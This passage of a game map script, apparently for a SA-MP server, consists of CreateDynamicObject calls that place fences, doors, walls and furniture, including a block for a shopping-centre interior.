	CreateDynamicObject(995, -1848.19995, 70.40000, 1054.69995,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(995, -1846.90002, 66.80000, 1054.69995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(995, -1846.90002, 62.80000, 1054.69995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(995, -1846.69995, 62.00000, 1054.69995,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(995, -1842.80005, 61.90000, 1054.69995,   0.00000, 0.00000, 181.47032);
	CreateDynamicObject(995, -1842.40002, 66.00000, 1054.69995,   0.00000, 0.00000, 269.46667);
	CreateDynamicObject(995, -1842.40002, 69.60000, 1054.69995,   0.00000, 0.00000, 269.92972);
	CreateDynamicObject(995, -1842.40002, 72.10000, 1054.69995,   0.00000, 0.00000, 269.92859);
	CreateDynamicObject(1523, -1888.90002, 59.30000, 1054.09998,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1523, -1888.80005, 59.60000, 1054.09998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, -1888.80005, 55.60000, 1055.80005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, -1888.80005, 63.30000, 1055.80005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, -1888.90002, 55.60000, 1055.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1649, -1888.89941, 63.29980, 1055.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1649, -1888.80005, 59.60000, 1058.19995,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2395, -1869.80005, 49.50000, 1057.40002,   359.99240, 89.76355, 180.20372);
	CreateDynamicObject(2938, -1897.59961, 59.79980, 1056.80005,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2938, -1895.00000, 65.80000, 1056.80005,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2938, -1895.00000, 53.69922, 1056.80005,   0.00000, 0.00000, 90.64618);
	CreateDynamicObject(2688, -1853.50000, 49.60000, 1055.69995,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3468, -1836.50000, 60.60000, 1054.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(7313, -1861.69995, 49.40000, 1056.69995,   0.00000, 0.00000, 180.11154);
	CreateDynamicObject(2200, -1871.69995, 49.30000, 1054.19995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1256, -1879.09998, 49.90000, 1054.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1256, -1882.80005, 49.90000, 1054.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1256, -1886.59998, 49.90000, 1054.80005,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1550, -1870.19995, 48.40000, 1054.40002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1550, -1870.19995, 47.90000, 1054.40002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, -1889.19995, 59.50000, 1054.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, -1890.19995, 59.50000, 1054.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, -1893.50000, 53.80000, 1054.90002,   0.00000, 0.00000, 180.49988);
	CreateDynamicObject(2614, -1889.09998, 59.50000, 1057.50000,   0.00000, 0.00000, 270.84790);
	CreateDynamicObject(1583, -1890.80005, 53.90000, 1054.19995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1585, -1892.00000, 53.90000, 1054.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1584, -1893.09998, 53.90000, 1054.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, -1889.30005, 53.90000, 1054.09998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2395, -1889.30005, 53.90000, 1056.59998,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1893.00000, 53.90000, 1054.09998,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1893.00000, 53.90000, 1055.69995,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1895.00000, 53.90000, 1055.69995,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1895.19995, 53.90000, 1054.09998,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(2395, -1897.40002, 54.30000, 1054.09998,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1897.40002, 54.30000, 1056.30005,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1897.40002, 57.50000, 1054.09998,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1897.40002, 57.50000, 1056.30005,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1897.40002, 61.20000, 1054.09998,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1897.40002, 61.20000, 1055.90002,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1897.40002, 62.60000, 1055.90002,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1897.40002, 62.80000, 1054.09998,   0.00000, 0.00000, 89.99451);
	CreateDynamicObject(2395, -1897.00000, 65.70000, 1054.09998,   0.00000, 0.00000, 0.03052);
	CreateDynamicObject(2395, -1897.00000, 65.70000, 1055.90002,   0.00000, 0.00000, 0.02747);
	CreateDynamicObject(2395, -1893.30005, 65.70000, 1054.09998,   0.00000, 0.00000, 0.02747);
	CreateDynamicObject(2395, -1893.30005, 65.70000, 1055.69995,   0.00000, 0.00000, 0.02747);
	CreateDynamicObject(2395, -1892.19995, 65.70000, 1054.09998,   0.00000, 0.00000, 0.02747);
	CreateDynamicObject(2395, -1892.19995, 65.70000, 1055.80005,   0.00000, 0.00000, 0.02747);
	CreateDynamicObject(2395, -1889.09998, 65.90000, 1054.09998,   0.00000, 0.00000, 270.02747);
	CreateDynamicObject(2395, -1889.09998, 65.30000, 1056.69995,   0.00000, 0.00000, 270.02197);
	CreateDynamicObject(2395, -1889.09998, 62.20000, 1056.69995,   0.00000, 0.00000, 270.02197);
	CreateDynamicObject(2395, -1889.09998, 59.00000, 1056.69995,   0.00000, 0.00000, 270.02197);
	CreateDynamicObject(2395, -1889.09998, 55.90000, 1056.69995,   0.00000, 0.00000, 270.02197);
	CreateDynamicObject(2395, -1889.09998, 55.80000, 1054.09998,   0.00000, 0.00000, 270.02197);
	CreateDynamicObject(1566, -1897.40002, 58.20000, 1055.69995,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1566, -1897.40002, 61.30000, 1055.69995,   0.00000, 0.00000, 269.71191);
	CreateDynamicObject(1495, -1837.40002, 49.40000, 1054.19995,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1495, -1841.50000, 49.40000, 1054.19995,   0.00000, 0.00000, 359.99451);
	CreateDynamicObject(2395, -1838.09998, 49.40000, 1054.09998,   0.00000, 0.00000, 180.00000);
	
	// --------- INTERIOR CENTRO COMERCIAL ----------
	
	CreateDynamicObject(19450, 265.06906, 114.50306, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 266.89120, 114.50364, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.38199, 114.52661, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 273.87170, 114.53117, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19450, 260.34137, 109.67805, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 275.40302, 109.79510, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 275.63831, 114.58850, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 266.88971, 124.10940, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.36270, 124.10940, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 273.83173, 124.10854, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19388, 265.06400, 120.91960, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 275.63800, 120.93365, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 275.63541, 125.61919, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8614, 260.33820, 121.44661, 1034.37695,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 265.06400, 114.52240, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19450, 269.82050, 109.77510, 1037.20178,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(19431, 275.40302, 109.79510, 1037.20178,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(19450, 260.31305, 122.44313, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 120.15200, 1032.29248,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 116.69200, 1032.29248,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 260.32660, 120.62079, 1032.29248,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19388, 265.06400, 128.50549, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 280.44180, 121.93542, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 285.23013, 119.75137, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 280.45081, 115.02309, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 285.23010, 129.27620, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 280.44180, 131.58620, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 275.63831, 123.29090, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 278.56070, 115.86320, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 278.56070, 117.37570, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 277.27557, 118.10644, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 281.56247, 117.38676, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 280.19800, 118.10640, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 283.38019, 118.10640, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 281.56250, 115.88630, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2525, 277.08780, 115.59636, 1032.38098,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2523, 276.17206, 116.14883, 1032.38037,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2092, 278.44708, 115.29752, 1032.37463,   0.00000, 0.00000, -62.34002);
	CreateDynamicObject(2525, 280.15427, 115.61926, 1032.38098,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2092, 278.68115, 115.11398, 1032.37463,   0.00000, 0.00000, -183.90005);
	CreateDynamicObject(2523, 279.13339, 115.96354, 1032.38037,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2525, 283.72705, 115.60013, 1032.38098,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2092, 281.62943, 115.12589, 1032.37463,   0.00000, 0.00000, -183.90005);
	CreateDynamicObject(2523, 282.16190, 115.72091, 1032.38037,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2136, 277.71091, 121.32070, 1032.25964,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2136, 279.71350, 121.32070, 1032.25964,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2136, 281.67520, 121.32070, 1032.25964,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2136, 283.63840, 121.32074, 1032.25964,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 279.47797, 121.83986, 1033.69983,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 283.84070, 121.83990, 1033.69983,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 283.84070, 121.83990, 1033.69983,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1649, 279.47800, 121.83990, 1033.69983,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19454, 273.85172, 133.68800, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.36270, 133.68800, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 266.89047, 133.64328, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(1649, 275.59280, 129.30376, 1033.99927,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 275.59280, 129.30380, 1033.99927,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2639, 277.67630, 130.42241, 1032.83899,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 276.26419, 130.32950, 1032.37927,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2639, 278.51669, 130.45277, 1032.83899,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2637, 280.00409, 130.32950, 1032.37927,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2639, 281.51801, 130.42239, 1032.83899,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2639, 282.37991, 130.45280, 1032.83899,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2637, 283.58301, 130.32950, 1032.37927,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2639, 284.69739, 130.42239, 1032.83899,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1984, 281.88983, 122.48601, 1032.23560,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2416, 284.46188, 123.45412, 1032.27649,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2415, 284.45407, 124.32687, 1032.30688,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2453, 281.87482, 122.49926, 1033.50403,   0.00000, 0.00000, 24.48000);
	CreateDynamicObject(2682, 276.18079, 129.77312, 1032.98389,   0.00000, 0.00000, -51.36000);
	CreateDynamicObject(2682, 280.11554, 130.86760, 1032.98389,   0.00000, 0.00000, -19.20000);
	CreateDynamicObject(2682, 283.49405, 130.14841, 1032.98389,   0.00000, 0.00000, 59.70000);
	CreateDynamicObject(2764, 276.99487, 123.45153, 1032.79077,   0.00000, 0.00000, 55.80001);
	CreateDynamicObject(2764, 279.15231, 123.31051, 1032.79077,   0.00000, 0.00000, 55.80001);
	CreateDynamicObject(2764, 279.15997, 127.14786, 1032.79077,   0.00000, 0.00000, 55.80001);
	CreateDynamicObject(2764, 276.96109, 127.15708, 1032.79077,   0.00000, 0.00000, 55.80001);
	CreateDynamicObject(2764, 281.25195, 127.17951, 1032.79077,   0.00000, 0.00000, 55.80001);
	CreateDynamicObject(2645, 275.80441, 124.47552, 1034.11145,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2636, 278.61850, 122.56708, 1032.99475,   0.00000, 0.00000, 232.08002);
	CreateDynamicObject(2636, 276.26801, 122.65340, 1032.99475,   0.00000, 0.00000, 232.08002);
	CreateDynamicObject(2636, 276.46533, 126.66473, 1032.99475,   0.00000, 0.00000, 232.08002);
	CreateDynamicObject(2636, 278.62946, 126.54395, 1032.99475,   0.00000, 0.00000, 232.08002);
	CreateDynamicObject(2636, 280.78101, 126.59417, 1032.99475,   0.00000, 0.00000, 232.08002);
	CreateDynamicObject(2636, 279.76758, 122.96095, 1032.99475,   0.00000, 0.00000, 331.62009);
	CreateDynamicObject(2636, 277.60080, 123.03785, 1032.99475,   0.00000, 0.00000, 331.62009);
	CreateDynamicObject(2636, 277.64105, 126.73518, 1032.99475,   0.00000, 0.00000, 331.62009);
	CreateDynamicObject(2636, 279.87769, 126.73261, 1032.99475,   0.00000, 0.00000, 331.62009);
	CreateDynamicObject(2636, 282.04410, 126.84439, 1032.99475,   0.00000, 0.00000, 331.62009);
	CreateDynamicObject(2636, 279.77606, 124.11001, 1032.99475,   0.00000, 0.00000, 412.86011);
	CreateDynamicObject(2636, 277.56482, 124.19107, 1032.99475,   0.00000, 0.00000, 412.86011);
	CreateDynamicObject(2636, 277.37646, 127.74812, 1032.99475,   0.00000, 0.00000, 412.86011);
	CreateDynamicObject(2636, 279.71875, 127.91529, 1032.99475,   0.00000, 0.00000, 412.86011);
	CreateDynamicObject(2636, 281.78131, 127.97385, 1032.99475,   0.00000, 0.00000, 412.86011);
	CreateDynamicObject(2636, 280.50156, 127.68061, 1032.99475,   0.00000, 0.00000, 506.04025);
	CreateDynamicObject(2636, 282.04410, 126.84439, 1032.99475,   0.00000, 0.00000, 331.62009);
	CreateDynamicObject(2636, 278.40991, 127.62055, 1032.99475,   0.00000, 0.00000, 506.04025);
	CreateDynamicObject(2636, 276.20560, 127.67563, 1032.99475,   0.00000, 0.00000, 506.04025);
	CreateDynamicObject(2636, 276.28229, 123.91212, 1032.99475,   0.00000, 0.00000, 506.04025);
	CreateDynamicObject(2636, 278.37833, 123.90021, 1032.99475,   0.00000, 0.00000, 506.04025);
	CreateDynamicObject(2426, 284.85327, 125.30323, 1032.38037,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2426, 284.85327, 125.30323, 1032.74072,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2426, 284.85327, 125.30323, 1033.10107,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1582, 281.88824, 123.42364, 1033.16309,   0.00000, 0.00000, 31.56000);
	CreateDynamicObject(19458, 280.41422, 130.68469, 1032.29248,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19458, 280.41422, 127.21870, 1032.29248,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19458, 280.41422, 123.74920, 1032.29248,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(2645, 285.06186, 127.20161, 1034.11145,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19450, 260.28589, 129.52933, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19462, 260.32547, 124.26932, 1032.29248,   0.00000, 90.00000, -90.00000);
	CreateDynamicObject(19462, 260.32550, 127.74790, 1032.29248,   0.00000, 90.00000, -90.00000);
	CreateDynamicObject(19450, 255.79468, 127.26442, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1843, 262.80661, 123.05690, 1032.24512,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1843, 259.80551, 123.05690, 1032.24512,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1842, 256.85770, 124.06744, 1032.83374,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1984, 258.59836, 128.92680, 1032.23560,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1848, 261.55826, 128.93651, 1031.90723,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1843, 262.18253, 126.72494, 1032.24512,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1843, 262.18250, 125.68490, 1032.24512,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2012, 256.10745, 127.53432, 1032.20203,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 265.14249, 124.72597, 1033.90735,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19462, 260.32739, 124.24550, 1035.53918,   0.00000, 90.00000, -90.00000);
	CreateDynamicObject(19462, 260.32623, 127.73360, 1035.53918,   0.00000, 90.00000, -90.00000);
	CreateDynamicObject(19450, 260.33459, 120.27294, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 255.59753, 127.17908, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19450, 260.33820, 129.57240, 1037.20178,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(2415, 256.24490, 128.77484, 1035.59680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2417, 257.08615, 129.04076, 1035.46533,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2418, 258.03830, 128.82503, 1035.51624,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2427, 257.89240, 126.95070, 1036.62708,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 256.16614, 126.85382, 1035.58044,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 257.15329, 126.85380, 1035.58044,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 258.13440, 126.85380, 1035.58044,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 259.12140, 126.85380, 1035.58044,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 260.10641, 126.85380, 1035.58044,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2440, 261.09219, 126.85380, 1035.58044,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 261.12201, 127.84880, 1035.58044,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1481, 259.67249, 128.85480, 1036.31494,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 265.14249, 124.72600, 1033.90735,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 265.14249, 124.72597, 1037.11365,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1649, 265.14249, 124.72600, 1037.11365,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 263.04843, 122.43989, 1036.12402,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 255.49309, 122.31426, 1037.20178,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(19431, 256.20648, 121.47908, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19431, 256.20651, 119.91080, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19450, 260.33459, 120.27290, 1037.20178,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(970, 265.13483, 129.02139, 1036.12402,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1737, 263.22736, 123.72574, 1035.60669,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1737, 260.63821, 123.72570, 1035.60669,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1720, 264.27603, 124.53553, 1035.55298,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1720, 263.51389, 124.53550, 1035.55298,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1720, 261.57880, 124.53550, 1035.55298,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1720, 260.74780, 124.53550, 1035.55298,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1720, 260.78247, 123.10200, 1035.55298,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1720, 261.53549, 123.10200, 1035.55298,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1720, 263.57419, 123.10200, 1035.55298,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1720, 264.23831, 123.10200, 1035.55298,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3920, 258.49606, 129.60434, 1037.80237,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(639, 255.74243, 125.80984, 1036.46362,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(949, 260.03482, 122.68638, 1036.29163,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(949, 255.96815, 122.62233, 1036.29163,   0.00000, 0.00000, 22.98000);
	CreateDynamicObject(949, 260.03482, 122.68638, 1036.29163,   0.00000, 0.00000, -118.13995);
	CreateDynamicObject(2247, 261.41519, 123.64693, 1036.82227,   0.00000, 0.00000, 18.60000);
	CreateDynamicObject(2247, 263.82535, 123.65295, 1036.82227,   0.00000, 0.00000, -11.70000);
	CreateDynamicObject(19431, 265.06400, 119.91080, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19431, 265.06400, 121.47910, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19431, 265.06400, 121.73630, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(2427, 261.06885, 127.53394, 1036.62708,   0.00000, 0.00000, 62.27999);
	CreateDynamicObject(19450, 265.06400, 134.37781, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19450, 265.06400, 134.37781, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 266.87592, 143.25800, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.36270, 143.24429, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 273.85172, 143.24429, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19388, 275.63541, 133.10770, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 280.44180, 121.93542, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 285.23010, 138.89560, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19448, 280.41422, 133.43480, 1032.29297,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19448, 280.41422, 136.93719, 1032.29297,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19448, 280.41422, 140.43710, 1032.29297,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19448, 280.41269, 143.91852, 1032.29297,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(1649, 275.62491, 136.84554, 1033.90735,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1649, 275.62491, 141.16631, 1033.90735,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1649, 275.62491, 136.84550, 1033.90735,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 275.62491, 141.16631, 1033.90735,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 275.63541, 144.17250, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 280.42627, 145.72237, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 275.63541, 145.71970, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 285.23010, 144.48830, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 285.23010, 146.08040, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2371, 283.48755, 134.30389, 1032.35852,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2371, 281.35443, 134.34413, 1032.35852,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2371, 279.38257, 134.38321, 1032.35852,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3533, 256.30991, 120.81187, 1033.80396,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2387, 283.38351, 140.40160, 1032.37939,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2387, 282.14359, 140.40160, 1032.37939,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2387, 280.90399, 140.40160, 1032.37939,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2387, 279.66409, 140.40160, 1032.37939,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2412, 275.85022, 132.41396, 1032.38062,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2412, 275.82468, 134.47725, 1032.38062,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2624, 282.46771, 143.43861, 1034.01880,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18930, 284.94647, 144.79153, 1034.29651,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(18930, 284.93640, 144.51279, 1034.29651,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(18930, 284.97076, 144.19077, 1034.29651,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(18931, 284.96021, 143.83830, 1033.99780,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(18931, 284.96237, 143.53830, 1033.99780,   0.00000, -90.00000, 22.32000);
	CreateDynamicObject(18931, 284.96451, 143.23830, 1033.99780,   0.00000, -90.00000, 160.62001);
	CreateDynamicObject(18928, 284.95685, 142.60928, 1034.23792,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(18928, 284.93686, 142.30931, 1034.23792,   0.00000, -90.00000, 8.64000);
	CreateDynamicObject(18928, 284.95248, 142.12556, 1034.23792,   0.00000, -90.00000, 141.42003);
	CreateDynamicObject(18947, 284.30579, 145.38222, 1033.87817,   -12.77999, -90.66003, 91.73998);
	CreateDynamicObject(18947, 283.92444, 145.40619, 1033.87817,   -12.77999, -90.66003, 65.70000);
	CreateDynamicObject(18947, 284.64551, 145.39583, 1033.87817,   -12.77999, -90.66003, 111.41999);
	CreateDynamicObject(19488, 281.04489, 145.41119, 1033.99390,   2.16000, 15.42000, -23.16001);
	CreateDynamicObject(19488, 280.64044, 145.41405, 1033.99390,   2.16000, 15.42000, 26.46000);
	CreateDynamicObject(2626, 276.70834, 144.19408, 1032.71252,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2701, 274.89508, 134.45999, 1032.75769,   0.00000, 0.00000, -145.43996);
	CreateDynamicObject(2394, 279.11682, 135.03740, 1033.09753,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2394, 279.76300, 135.04568, 1033.09753,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2394, 281.07425, 135.01399, 1033.09753,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2394, 281.71982, 134.94023, 1033.09753,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2394, 283.19110, 134.97716, 1033.09753,   0.00000, 0.00000, 270.00000);
